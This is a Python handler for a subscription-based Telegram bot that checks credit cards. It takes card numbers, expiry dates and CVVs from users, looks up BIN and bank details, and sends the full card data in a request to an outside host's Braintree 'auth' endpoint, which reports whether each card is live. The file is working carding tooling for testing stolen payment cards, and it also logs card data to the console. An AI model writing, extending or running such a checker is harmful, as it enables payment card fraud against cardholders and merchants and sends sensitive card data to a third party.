from data.config import OWNER_NAME, PREFIX
import requests
from aiogram import types
from aiogram.types import Message
from loader import dp, bot
from main import PREFIX, ok
from handlers.admin.ssk_sk import sk_single
from database import srffetch_timer, create_free, check_Freeuser, srftimer
import time
from new.luhn import get_cards
from main import BINS_DICT
@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
  type = ok(message.from_user.id)
  if type == 'PAID' or type == "OWNER" or type == "ADMIN":
    pass
  else:
    return await message.reply(
        f"<b>this gate is for subscribers only. Upgrade to access this feature, Contact My Owner {OWNER_NAME} to subscribe.</b>"
      )
  tic = time.perf_counter()
  paid = open("files/group.txt").read().splitlines()
  if "supergroup" in message.chat.type or "group" in message.chat.type:
    if str(message.chat.id) in paid:
      pass
    else:
      await message.reply(
        f"<b> This Chat IS Not Allowed Contact My master {OWNER_NAME}  I Am Leaving :)</b>"
      )
      return await bot.leave_chat(message.chat.id)

  user_id = int(message.from_user.id)
  kk = await message.reply(
    f'{message.from_user.first_name} wait i am checking  your card')
  time.sleep(1)
  if check_Freeuser(user_id) == False:
    create_free(user_id)
  results = srffetch_timer(user_id)
  count_antispam = int(time.time()) - results
  status = ok(user_id)
  if 'FREE' in status and count_antispam < 30:
    after = 50 - count_antispam
    resp = f"""
{message.from_user.mention} ⚠️𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
    """
    return await kk.edit_text(resp)
  elif 'PAID' in status and count_antispam < 5:
    after = 10 - count_antispam
    resp = f"""
{message.from_user.mention} ⚠️𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
    """
    return await kk.edit_text(resp)
  elif 'ADMIN' in status and count_antispam < 5:
    after = 5 - count_antispam
    resp = f"""
{message.from_user.mention} ⚠️𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
    """
    return await kk.edit_text(resp)
  try:
    if message.reply_to_message:
      cc = message.reply_to_message.text
    else:
      cc = message.text
    if len(cc) == 0:
      return await kk.edit_text("<b>No Card to chk</b>")
    x = cc
    if get_cards(x) == False:
      return await kk.edit_text("no cards to check please give me a card")
    cards = get_cards(x)
    cc, mes, ano, cvv = cards[0]
    fbin = cc[:6]
    session = requests.session()
    bin = BINS_DICT[fbin]
    try:
      brand = bin["vendor"].upper()
    except:
      brand = "N/A"
    try:
      type = bin["type"].upper()
    except:
      type = "N/A"
    try:
      level = bin["level"].upper()
    except:
      level = "N/A"
    try:
      bank = bin["bank_name"].upper()
    except:
      bank = "N/A"
    try:
      country = bin["country"].upper()
    except:
      country = "N/A"
    try:
      flag = bin["flag"]
    except:
      flag = "N/A"

    toc = time.perf_counter()
    data = f"""Gateway Braintree Auth.♻️
CC -» <code>{cc}|{mes}|{ano}|{cvv}</code>
Checking CC. Please wait.🟥
Time -» {toc - tic:0.2f}"""
    await kk.edit_text(f"<b>{data}</b>")
    toc = time.perf_counter()
    print(f'{cc}|{mes}|{ano}|{cvv}')
    gg = requests.get(f'https://x-oxo.online/braintree/a0u.php?lista={cc}|{mes}|{ano}|{cvv}')
    print(gg.text)
    ggf = gg.json()['response']
    data = f"""Gateway Braintree Auth.♻️
CC -» <code>{cc}|{mes}|{ano}|{cvv}</code>
Checking CC. Please wait.🟨
Time -» {toc - tic:0.2f}"""
    await kk.edit_text(f"<b>{data}</b>")
    toc = time.perf_counter()
    data = f"""Gateway Braintree Auth.♻️
CC -» <code>{cc}|{mes}|{ano}|{cvv}</code>
Checking CC. Please wait.🟩
Time -» {toc - tic:0.2f}"""
    await kk.edit_text(f"<b>{data}</b>")
    toc = time.perf_counter()
    await kk.edit_text(f"""
Card -» <code>{cc}|{mes}|{ano}|{cvv}</code>
Gateway -» <b>Braintree [Auth]</b>
Status -» <b>{ggf}</b>

Bin -» <b>{brand} - {type} - {level}</b>
Bank -» <b>{bank}</b>
Country -» <b>{country}[{flag}]</b>

Took -»<code>{toc - tic:0.2f}</code>s
Checked by -» {message.from_user.username} <b> [{ok(message.from_user.id)}]</b>
Bot by --» {OWNER_NAME}""")
    phone_no = int(time.time())
    srftimer(phone_no, user_id)
  except Exception as e:
    print(e)


